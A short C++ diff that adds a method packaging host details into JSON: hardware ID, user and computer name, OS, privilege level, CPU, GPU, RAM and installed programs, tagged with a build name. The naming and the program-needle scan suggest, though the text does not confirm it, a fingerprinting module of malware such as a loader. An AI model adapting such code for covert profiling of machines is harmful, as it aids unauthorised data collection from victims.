@@ -44,6 +44,28 @@ namespace absent
 				getHardwareID();
 				getInstalledPrograms();
 			}
+
+			nlohmann::json getJson(std::string buildName)
+			{
+				nlohmann::json jInfo = {
+					{"buildName", buildName},
+					{"hardwareID", hardwareID},
+					{"userName", userName},
+					{"computerName", computerName},
+					{"operatingSystem", operatingSystem},
+					{"privilege", privilege},
+					{"installPath", installPath},
+					{"cpu", cpu},
+					{"cpuArchitecture", cpuArchitecture},
+					{"cpuCores", cpuCores},
+					{"gpu", gpu},
+					{"ram", ram},
+					{"vram", vram},
+					{"installedPrograms", installedPrograms}
+				};
+				return jInfo;
+			}
+
 		private:
 			std::list<std::string> programNeedles;
 
